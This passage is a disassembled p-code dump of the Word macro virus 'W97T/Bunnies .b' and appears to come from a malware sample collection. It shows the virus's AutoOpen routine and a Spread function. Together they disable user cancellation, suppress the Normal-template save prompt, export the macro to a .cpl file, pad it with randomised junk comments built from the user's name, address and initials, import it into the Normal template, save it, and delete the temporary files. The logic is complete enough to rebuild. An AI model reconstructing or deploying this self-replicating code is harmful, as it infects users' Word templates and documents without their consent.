' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #122:
' 	QuoteRem 0x0001 0x0000 ""
' Line #123:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #124:
' 	QuoteRem 0x0001 0x0000 ""
' Line #125:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #126:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #127:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #128:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #129:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #130:
' 	QuoteRem 0x0001 0x0007 "3707428"
' Line #131:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #132:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #133:
' 	QuoteRem 0x0001 0x0007 "7384228"
' Line #134:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #135:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #136:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #137:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #138:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #139:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #140:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #141:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #142:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #143:
' 	QuoteRem 0x0000 0x004C " Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error"
' Line #144:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #145:
' 	QuoteRem 0x0001 0x0000 ""
' Line #146:
' 	QuoteRem 0x0001 0x0000 ""
' Line #147:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	ArgsCall Kill 0x0001 
' Line #148:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #149:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #150:
' 	QuoteRem 0x0001 0x0007 "1433757"
' Line #151:
' 	Dim 
' 	VarDefn OldName
' Line #152:
' 	QuoteRem 0x0001 0x0007 "2441554"
' Line #153:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #154:
' 	QuoteRem 0x0001 0x0000 ""
' Line #155:
' 	Dim 
' 	VarDefn NewName
' Line #156:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #157:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #158:
' 	QuoteRem 0x0001 0x0000 ""
' Line #159:
' 	LitStr 0x001D "C:\Windows\System\bunnies.cpl"
' 	St OldName 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	St NewName 
' Line #160:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #161:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #162:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #163:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #164:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #165:
' 	QuoteRem 0x0001 0x0000 ""
' Line #166:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #167:
' 	StartWithExpr 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #168:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #169:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #170:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #171:
' 	EndWith 
' Line #172:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #173:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #174:
' 	QuoteRem 0x0001 0x0007 "8045723"
' Line #175:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #176:
' 	QuoteRem 0x0001 0x0000 ""
' Line #177:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #178:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #179:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #180:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #181:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #182:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #183:
' 	LitStr 0x000B "Bunnies!!!!"
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #184:
' 	QuoteRem 0x0001 0x0000 ""
' Line #185:
' 	QuoteRem 0x0001 0x0000 ""
' Line #186:
' 	QuoteRem 0x0001 0x0000 ""
' Line #187:
' 	LitStr 0x001D "C:\Windows\System\Bunnies.cpl"
' 	ArgsCall Kill 0x0001 
' Line #188:
' 	QuoteRem 0x0001 0x0007 "6648766"
' Line #189:
' 	QuoteRem 0x0001 0x0007 "5110557"
' Line #190:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #191:
' 	LitStr 0x0017 "C:\Windows\System\B.cpl"
' 	ArgsCall Kill 0x0001 
' Line #192:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #193:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #194:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #195:
' 	EndFunc 
' Line #196:
' 	QuoteRem 0x0001 0x0006 "319395"
' Line #197:
' 	QuoteRem 0x0001 0x0007 "9915977"
' Line #198:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #199:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #200:
' 	QuoteRem 0x0001 0x0001 "T"
' Macros/VBA/BunniesB2 - 17596 bytes
' Line #0:
' 	QuoteRem 0x0001 0x0007 "7767478"
' Line #1:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #2:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #3:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #4:
' 	QuoteRem 0x0001 0x0007 "7017760"
' Line #5:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #6:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #7:
' 	Dim (Public) 
' 	VarDefn SCode (As String)
' Line #8:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #9:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #10:
' 	QuoteRem 0x0001 0x0000 ""
' Line #11:
' 	QuoteRem 0x0001 0x0000 ""
' Line #12:
' 	QuoteRem 0x0001 0x0007 "7894474"
' Line #13:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #14:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #15:
' 	Dim (Public) 
' 	VarDefn stuff (As String)
' Line #16:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #17:
' 	QuoteRem 0x0001 0x0006 "733070"
' Line #18:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #19:
' 	QuoteRem 0x0001 0x0007 "8961297"
' Line #20:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #21:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #22:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #23:
' 	QuoteRem 0x0000 0x0010 " W97T/Bunnies .b"
' Line #24:
' 	QuoteRem 0x0001 0x0006 "430310"
' Line #25:
' 	QuoteRem 0x0001 0x0000 ""
' Line #26:
' 	QuoteRem 0x0001 0x0000 ""
' Line #27:
' 	QuoteRem 0x0001 0x0000 ""
' Line #28:
' 	QuoteRem 0x0001 0x0007 "1696184"
' Line #29:
' 	QuoteRem 0x0001 0x0000 ""
' Line #30:
' 	QuoteRem 0x0001 0x0000 ""
' Line #31:
' 	QuoteRem 0x0000 0x0028 " Word Trojan Bunnies .b variant by Error"
' Line #32:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #33:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #34:
' 	QuoteRem 0x0001 0x0007 "6759682"
' Line #35:
' 	QuoteRem 0x0001 0x0007 "5163674"
' Line #36:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #37:
' 	QuoteRem 0x0001 0x0000 ""
' Line #38:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #39:
' 	FuncDefn (Sub AutoOpen())
' Line #40:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #41:
' 	QuoteRem 0x0001 0x0000 ""
' Line #42:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #43:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #44:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #45:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #46:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	QuoteRem 0x0001 0x0000 ""
' Line #49:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #50:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #51:
' 	QuoteRem 0x0001 0x0000 ""
' Line #52:
' 	QuoteRem 0x0001 0x0000 ""
' Line #53:
' 	QuoteRem 0x0001 0x0007 "3010827"
' Line #54:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #55:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #56:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #57:
' 	QuoteRem 0x0001 0x0000 ""
' Line #58:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #59:
' 	QuoteRem 0x0001 0x0000 ""
' Line #60:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #61:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #62:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #64:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #65:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #66:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #67:
' 	QuoteRem 0x0001 0x0007 "9088293"
' Line #68:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #69:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #70:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #71:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	ArgsLd Dir 0x0001 
' 	St SCode 
' Line #72:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #73:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #74:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #75:
' 	QuoteRem 0x0001 0x0000 ""
' Line #76:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #77:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #78:
' 	QuoteRem 0x0001 0x0007 "7173024"
' Line #79:
' 	Ld SCode 
' 	LitStr 0x0005 "b.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Spread 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #80:
' 	QuoteRem 0x0001 0x0000 ""
' Line #81:
' 	QuoteRem 0x0001 0x0007 "6185727"
' Line #82:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #83:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #84:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #85:
' 	QuoteRem 0x0001 0x0007 "8590480"
' Line #86:
' 	QuoteRem 0x0001 0x0006 "970648"
' Line #87:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Paren 
' 	LitStr 0x0008 "BunniesB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #88:
' 	QuoteRem 0x0001 0x0007 "1851448"
' Line #89:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #90:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #91:
' 	QuoteRem 0x0001 0x0000 ""
' Line #92:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #93:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #94:
' 	QuoteRem 0x0001 0x0000 ""
' Line #95:
' 	ArgsCall (Call) Spread 0x0000 
' Line #96:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #97:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #98:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #99:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #100:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #101:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #102:
' 	QuoteRem 0x0001 0x0007 "2138128"
' Line #103:
' 	EndSub 
' Line #104:
' 	QuoteRem 0x0001 0x0007 "3272920"
' Line #105:
' 	QuoteRem 0x0001 0x0007 "3424502"
' Line #106:
' 	QuoteRem 0x0001 0x0007 "5677673"
' Line #107:
' 	QuoteRem 0x0001 0x0000 ""
' Line #108:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #109:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #110:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #111:
' 	FuncDefn (Function Spread())
' Line #112:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #113:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #114:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #115:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #116:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #117:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #118:
' 	QuoteRem 0x0001 0x0007 "5673587"
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	QuoteRem 0x0001 0x0007 "9475296"
' Line #121:
' 	QuoteRem 0x0001 0x0000 ""
' Line #122:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #123:
' 	QuoteRem 0x0001 0x0000 ""
' Line #124:
' 	QuoteRem 0x0001 0x0007 "2392120"
' Line #125:
' 	QuoteRem 0x0001 0x0000 ""
' Line #126:
' 	QuoteRem 0x0001 0x0000 ""
' Line #127:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #128:
' 	QuoteRem 0x0001 0x0000 ""
' Line #129:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #130:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #131:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #132:
' 	QuoteRem 0x0001 0x0000 ""
' Line #133:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #134:
' 	QuoteRem 0x0001 0x0000 ""
' Line #135:
' 	QuoteRem 0x0000 0x003C " Begin to do what bunnies do...Now with exponential growth!!"
' Line #136:
' 	QuoteRem 0x0001 0x0007 "2134042"
' Line #137:
' 	QuoteRem 0x0001 0x0007 "7349121"
' Line #138:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #139:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #140:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #141:
' 	QuoteRem 0x0001 0x0000 ""
' Line #142:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #143:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #144:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #145:
' 	QuoteRem 0x0001 0x0007 "2519186"
' Line #146:
' 	QuoteRem 0x0001 0x0000 ""
' Line #147:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #148:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #149:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #150:
' 	QuoteRem 0x0001 0x0000 ""
' Line #151:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #152:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #153:
' 	QuoteRem 0x0001 0x0006 "372511"
' Line #154:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #155:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #156:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #157:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #158:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #159:
' 	LitStr 0x001D "C:\Windows\system\bunnies.cpl"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #160:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #161:
' 	QuoteRem 0x0001 0x0007 "3035342"
' Line #162:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #163:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #164:
' 	QuoteRem 0x0001 0x0007 "3764561"
' Line #165:
' 	QuoteRem 0x0001 0x0000 ""
' Line #166:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #167:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #168:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #169:
' 	QuoteRem 0x0001 0x0007 "7713765"
' Line #170:
' 	QuoteRem 0x0001 0x0007 "8828058"
' Line #171:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #172:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #173:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #174:
' 	QuoteRem 0x0001 0x0000 ""
' Line #175:
' 	Do 
' Line #176:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #177:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #178:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #179:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #180:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #181:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #182:
' 	QuoteRem 0x0001 0x0007 "7869626"
' Line #183:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #184:
' 	QuoteRem 0x0001 0x0000 ""
' Line #185:
' 	QuoteRem 0x0001 0x0007 "3162338"
' Line #186:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #187:
' 	QuoteRem 0x0001 0x0000 ""
' Line #188:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #189:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #190:
' 	QuoteRem 0x0001 0x0007 "1667250"
' Line #191:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #192:
' 	QuoteRem 0x0001 0x0007 "2548050"
' Line #193:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #194:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #195:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #196:
' 	QuoteRem 0x0001 0x0000 ""
' Line #197:
' 	QuoteRem 0x0001 0x0000 ""
' Line #198:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #199:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #200:
' 	QuoteRem 0x0001 0x0007 "2806128"
' Line #201:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #202:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #203:
' 	QuoteRem 0x0001 0x0007 "7617791"
' Line #204:
' 	QuoteRem 0x0001 0x0000 ""
' Line #205:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #206:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #207:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #208:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #209:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #210:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #211:
' 	QuoteRem 0x0001 0x0000 ""
' Line #212:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #213:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #214:
' 	QuoteRem 0x0001 0x0000 ""
' Line #215:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #216:
' 	QuoteRem 0x0001 0x0000 ""
' Line #217:
' 	QuoteRem 0x0001 0x0007 "6959961"
' Line #218:
' 	QuoteRem 0x0001 0x0000 ""
' Line #219:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #220:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #221:
' 	QuoteRem 0x0001 0x0000 ""
' Line #222:
' 	QuoteRem 0x0001 0x0007 "4694725"
' Line #223:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #224:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #225:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #226:
' 	QuoteRem 0x0001 0x0007 "6501271"
' Line #227:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #228:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #229:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #230:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #231:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #232:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #233:
' 	QuoteRem 0x0001 0x0007 "8979640"
' Line #234:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #235:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #236:
' 	QuoteRem 0x0001 0x0000 ""
' Line #237:
' 	QuoteRem 0x0001 0x0000 ""
' Line #238:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #239:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #240:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #241:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #242:
' 	QuoteRem 0x0001 0x0000 ""
' Line #243:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #244:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #245:
' 	QuoteRem 0x0001 0x0000 ""
' Line #246:
' 	QuoteRem 0x0001 0x0007 "2830643"
' Line #247:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #248:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #249:
' 	QuoteRem 0x0001 0x0000 ""
' Line #250:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #251:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #252:
' 	QuoteRem 0x0001 0x0007 "7640149"
' Line #253:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #254:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #255:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #256:
' 	QuoteRem 0x0001 0x0007 "7382071"
' Line #257:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #258:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #259:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #260:
' 	QuoteRem 0x0001 0x0007 "3711444"
' Line #261:
' 	QuoteRem 0x0001 0x0007 "3707428"
' Line #262:
' 	QuoteRem 0x0001 0x0007 "6243193"
' Line #263:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #264:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #265:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #266:
' 	QuoteRem 0x0001 0x0000 ""
' Line #267:
' 	QuoteRem 0x0001 0x0007 "7384228"
' Line #268:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #269:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #270:
' 	QuoteRem 0x0001 0x0007 "1437773"
' Line #271:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #272:
' 	QuoteRem 0x0001 0x0000 ""
' Line #273:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #274:
' 	QuoteRem 0x0001 0x0000 ""
' Line #275:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #276:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #277:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #278:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #279:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #280:
' 	QuoteRem 0x0001 0x0000 ""
' Line #281:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #282:
' 	QuoteRem 0x0001 0x0007 "1222553"
' Line #283:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #284:
' 	QuoteRem 0x0001 0x0000 ""
' Line #285:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #286:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #287:
' 	QuoteRem 0x0000 0x004C " Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error"
' Line #288:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #289:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #290:
' 	QuoteRem 0x0001 0x0000 ""
' Line #291:
' 	QuoteRem 0x0001 0x0000 ""
' Line #292:
' 	QuoteRem 0x0001 0x0007 "8817799"
' Line #293:
' 	QuoteRem 0x0001 0x0000 ""
' Line #294:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #295:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	ArgsCall Kill 0x0001 
' Line #296:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #297:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #298:
' 	QuoteRem 0x0001 0x0007 "5151258"
' Line #299:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #300:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #301:
' 	QuoteRem 0x0001 0x0007 "1433757"
' Line #302:
' 	QuoteRem 0x0001 0x0000 ""
' Line #303:
' 	Dim 
' 	VarDefn OldName
' Line #304:
' 	QuoteRem 0x0001 0x0000 ""
' Line #305:
' 	QuoteRem 0x0001 0x0007 "2441554"
' Line #306:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #307:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #308:
' 	QuoteRem 0x0001 0x0000 ""
' Line #309:
' 	QuoteRem 0x0001 0x0000 ""
' Line #310:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #311:
' 	Dim 
' 	VarDefn NewName
' Line #312:
' 	QuoteRem 0x0001 0x0007 "6802207"
' Line #313:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #314:
' 	QuoteRem 0x0001 0x0007 "9333955"
' Line #315:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #316:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #317:
' 	QuoteRem 0x0001 0x0000 ""
' Line #318:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #319:
' 	LitStr 0x001D "C:\Windows\System\bunnies.cpl"
' 	St OldName 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	St NewName 
' Line #320:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #321:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #322:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #323:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #324:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #325:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #326:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #327:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #328:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #329:
